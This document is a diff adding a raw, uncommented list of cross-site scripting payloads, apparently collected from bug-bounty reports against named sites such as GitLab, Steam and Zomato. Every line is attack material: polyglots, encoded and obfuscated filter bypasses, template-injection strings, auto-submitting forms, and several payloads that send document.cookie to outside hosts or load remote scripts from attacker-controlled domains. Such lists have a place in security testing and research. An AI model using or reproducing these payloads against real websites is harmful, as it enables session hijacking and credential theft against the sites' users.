@@ -1,0 +1,162 @@
+"/*\"/*`/*' /*</template> </textarea></noembed></noscript></title> </style></script>-->&lt;svg onload=/*<html/*/onmouseover=alert()//>
+
+data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTIGJ5IFZpY2tpZScpPC9zY3JpcHQ+"
+
+data:text/html,<script>alert(1)</script>
+
+<select><noembed></select><script x='a@b'a>
+"/lib/css/animated.min'"/><script%20>alert(document.domain)<%2fscript>.css"
+abc`;return+false});});alert`xss`;</script>
+[XSS](.alert(1);)
+”/>&_lt;_script>alert(1)&_lt;/scr_ipt>”/>
+
+\"><img src=1 onerror=\"url=String['fromCharCode'](104,116,116,112,115,58,47,47,103,97,116,111,108,111,117,99,111,46,48,48,48,119,101,98,104,111,115,116,97,112,112,46,99,111,109,47,99,115,109,111,110,101,121,47,105,110,100,101,120,46,112,104,112,63,116,111,107,101,110,115,61)+encodeURIComponent(document['cookie']);xhttp=&#x20new&#x20XMLHttpRequest();xhttp['open']('GET',url,true);xhttp['send']();
+
+
+
+\"><img src=1 onerror=\"alert('XSS')\">
+
+sm_testkick <a onmouseover="javascript:SteamOverlayAPI.OpenExternalBrowserURL('file://C:/Windows/System32/calc.exe')">The remote host stopped receiving communications and closed the connection</a>
+
+"><svg/onload=alert(document.domain)>
+javascript:alert(document.domain)
+<iframe <><a href=javascript&colon;alert(document.cookie)>Click Here</a>=&gt;&lt;/iframe&gt;
+
+<iframe src=javascript:alert(1) width=0 height=0 style=display:none;></iframe>
+<iframe src=javascript:eval(String.fromCharCode.apply(null,[108,101,116,32,116,101,115,116,32,61,32,49,50,51,59,10,97,108,101,114,116,40,116,101,115,116,41,59])) width=0 height=0 style=display:none;></iframe>
+
+"><img src=/ onerror=alert(document.domain)>
+
+%20guvo%3D%3C%2Fscript%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E
+</script><script>alert(1)</script>;
+alert(document.domain);
+<a><pre lang='f/" onerror=alert(1) onload=alert(1) '><code lang="wavedrom">xss</code></pre></a>
+
+</script><script>alert(1)</script>;
+"</textarea><script>alert(1)</script>"
+
+"><svg/onload=prompt(1)>
+"><script src="https://app-sj17.marketo.com/index.php/form/getForm?callback=alert"></script>
+
+"><script src=https://{$handle}.xss.ht></script>
+
+"><img src=x onerror=alert(document.domain)>
+"><svg onload=alert(1)>
+?q=OnMoUsEoVeR=prompt(/hacked/)//
+</script><script>alert(document.domain)</script>
+"><img src=x onerror=prompt>
+
+?utm_source=INJECTION%22%20style=%22animation-name:swoop-up%22%20onanimationstart=%22alert(document.domain)
+
+"'><img src=x onerror=prompt(1)>
+"><img src=x onerror=alert(document.domain)>
+urban dictionary "><img src=x<
+\\"><img src=x onerror=confirm(0)><svg/onload=confirm(0)>
+?referer=javascript:alert(document.domain)
+%F0%9F%98%82<%3CsVg/onload%F0%9F%98%82=/svg/onload%3Dsvg/onmouseOver=confirm`1`><!--%F0%9F%98%82//=
+
+😂<<sVg/onload😂=/svg/onload=svg/onmouseOver=confirm`1`><!--😂//=
+
+/?'"--><script>confirm(document.cookie)</script>
+[code]javascript://%0dalert%28document.cookie%29[/code]
+javascript://%0aalert(1)
+?Search=e<WJFJRC>1M2OQ[!%2b!]</WJFJRC>
+X-Forwarded-For: xss><svg/onload=globalThis[`al`+/ert/.source]`1`// 
+javascript:alert(1)//https://dqdqdqdqdq.myshopify.com
+"><img+src%3d"http%3a//<my_server_ip>/zomato.php%3fc%3dzomato_xss"+/>
+">yvvdwf-label<form class='hidden gl-show-field-errors'><input title='<script>alert(document.domain)</script>'>
+"><img src=x onerror=prompt(123)>
+"</script><svg/onload=alert(document.domain)>
+"</sc"ript><sv"g/onloa"d=aler"t"(document.doma"in)>
+?redirect=javascript:prompt(document.domain)%2f%2f
+<script>alert(1);</script>
+"><svg/onload=prompt(document.domain)>
+"><img src=/ onerror=alert(document.domain)>
+<h1>holaaaaaaa||<a href="http://<a href="http://<a href="http://<a href="javascript:alert(document.cookie)" onmouseover="javascript:alert(document.cookie)">aaaaaaaaaaaaaaaaaaaaaaaaaagle.com</a>">aaaaaaaaaaaaaaaaaaaaaaaaaagle.com</a>">aaaaaaaaaaaaaaaaaaaaaaaaaagle.com</a>">gle.com</a> hhh <h1>holaaaaaaa||<a href="http://<a href="http://<a href="http://<a href="javascript:window.location='https://growncheckerworl.com/cookie.php?cookie=document.cookie'" >aaaaaaaaaaaaaaaaaaaaaaaaaagle.com</a>">aaaaaaaaaaaaaaaaaaaaaaaaaagle.com</a>">aaaaaaaaaaaaaaaaaaaaaaaaaagle.com</a>">gle.com</a> hhhk
+
+"><img src=x onerror=alert(1)><x y="
+%27-alert(document.cookie)-%27
+?v0sjx'-alert(1)-'uyvvr=1
+alert(document.domain)
+'<script>alert(/XSS/);</script>'
+'onclick='alert(/XSS/);
+<script>alert(/XSS/);</script>
+"> <img src = x onerror = alert (1)> 
+ "><img src=x onerror=alert(9)>
+<img src=x onerror=alert(document.cookie)>
+">]<img src=x onerror=alert(document.domain)> ">]<img src=x onerror=alert(document.cookie)>
+{%25+macro+field()+%25}moc.okok//:ptth//)niamod.tnemucod(trela:tpircsavaj=daolno+gvshttp://http:""//{%25+endmacro+%25}{{+field(1)%7curlize%7creverse%7curlize%7creverse%7curlize%7creverse+}}
+<img src=x onmouseover=alert(1)>
+"><script>alert(0);</script>
+?return_url=javascript:alert(100)//
+?return_url=javascript:alert(document.cookie)
+X-Forwarded-Host: bing.com"><img src/onerror=prompt(document.cookie)>
+javascript://tumblr.com%0aalert(document.domain);
+javascript://x.com%0aalert(1);//
+"><svg/onload=alert(2)>
+"><script>alert(0);<%2Fscript>
+ "><img src=xx onerror=alert(document.domain)>
+"><script src=https://yourxssdomain></script>
+<img src="https://intensedebate.com/images/a-addblog.png" onload="alert()">
+%20onerror=%22prompt(1)%22%3Eaaaaaaaaaaaa
+<svg onload=alert(document.domain)>
+"><!--><svg/onload=alert(document.domain)>
+/*\"<sVg/oNloAd=alert(document.domain)//>\x3e
+<svg><use xlink:href="https://gitlab.com/yvvdwf/svg-use-xss-firefox/-/raw/master/xss.svg#xss"/></svg>
+<a href="https://gitlab.com/wbowling/private-project/-/issues/1" title="title">xss &lt;img onerror=alert(1) src=x></a>
+<div class="md"><p data-sourcepos="1:1-1:124" dir="auto">link: <a href="https://gitlab.com/wbowling/private-project/-/issues/1">xss <img onerror="alert(1)" src="x"></a></p></div>
+*/alert('XSS\n-Rohit Dua');
+'<script src=//blackfan.ru></script>'
+'<script>alert(QuoraAndroid.getClipboardData());</script>'
+<noscript><p title= "</noscript><img src=x onerror=alert(document.cookie)>">
+<img/src='x'/onerror=alert(document.domain)>
+</form><script>document.pisarenko.submit();</script>`
+<iframe src="//google.com"></iframe>
+<iframe src="\&quot;//google.com\&quot;"></iframe>
+<iframe src='//google.com'></iframe>
+<iframe src="//google.com"></iframe>
+"><img src="x" onerror="alert(document.cookie)">
+<Button href="javascript://%0aalert(document.domain)">XSS</Button>
+<<><img+src="x"/onerror="prompt(document.cookie)">
+<iframe srcdoc='<script src=https://gitlab.com/api/v4/projects/saleemrashid%2Fmermaid-exploit-7032e404/jobs/1303935016/artifacts/exploit.js></script>'></iframe>
+†‡•＜img src=a onerror=javascript:alert('hacked')>…‰€
+"><img src=x onerror=prompt('XSS');>
+<a/href=javascript:alert(0)><h1>pwn3d</h1></a>
+<div class="discus_dialogs_topic emphased tx-ellip">"&gt;<img src="x" onerror="alert()"></div>
+"/><img src=x onerror=alert(document.cookie)>
+%22%3E%3Cimg+src=x+onerror=alert(document.domain)%3E
+%3CIFRAME%20SRC%3D%22javascript%3Aalert%28%27XSS%27%29%22%3E.vm
+%22%20%2C%20internalSearchTerm%3A%20%5B7%5D.map%28alert%29%20%2C%20numOfSearchResultsReturned%3A%20%22b
+€{{amount}} "><img src=x onerror=prompt(document.domain)>
+<svg<script> onmou<script>seover</script>="alert('xss')">hii</svg</script>>
+"><img src=/ onerror="alert(location.host)"
+<svg/onload=confirm(document.domain)>
+javascript:alert(1)
+%00A<svg onload=alert(1)>
+"><svg onload=(alert)(1)>
+${alert(1)}
+<img src=1111111><img src=1111111><a href="javascript:alert&#40/1/&#41">axxx</a><svg></svg><img src=1>
+Host: allods.mail.ru:13373"--><script>alert(1);
+ # "><svg/onload=prompt(1)>
+%22%3e%3cimg%20onerro%3d%3e%3cimg%20src%3dx%20onerror%3dalert%601%60%3e
+<form action="https://dailydeals.mtn.co.za/index.cfm?GO=CRAVE_ESTABLISHMENTS_LIST" method="POST"><input type="hidden" name="location_id" value="0"><input type="hidden" name="suburb" value="0"><input type="hidden" name="search_phrase" value=""><input type="hidden" name="submit_search" value="Search"><input type="hidden" name="m" value=""><input type="hidden" name="cpID" value=""><input type="hidden" name="CFID" value="a611fd5d-822a-4c08-a032-bcac1551f032'&quot;<!--><Svg OnLoad=(confirm)(1)-->"><input type="hidden" name="CFTOKEN" value="0"></form><script>document.forms[0].submit()</script>
+<img src="x" onload=alert(document.cookie);>
+<svg/onload=alert(document.cookie);>
+'><iframe/srcdoc='<script/src=/yvvdwf/data/-/jobs/552156057/artifacts/raw/alert.js></script>'></iframe>
+ "><img src=x onerror=alert(document.cookie);.jpg
+ "/><img src=x onerror=alert(document.domain)>
+onclick=alert(1337)
+<img src=x onerror='alert()'>
+@<script>prompt(1337)</script>gmail.com
+"><script>alert(1)<%2fscript>l43ax
+<object type="text/x-scriptlet" data="https://xss.rocks/scriptlet.html"></object>
+"/><script>alert(/Bhati/)</script>
+{{constructor.constructor('alert(document.domain)')()}}
+"><img src=x onerror=prompt(1337)>
+"><img src=a onerror=alert(1)>123@sdf.com
+\%2e%2e\%2e%2e\%2e%2e\comments_dal\users\getGlobalLoginSettings%2ejson?callback=alert(%2fxss%2f);%2f%2f
+'"><img src=x onerror=
+
+
+
+{"<img onerror=confirm('Hacked_by_Nehru') src/>":1}
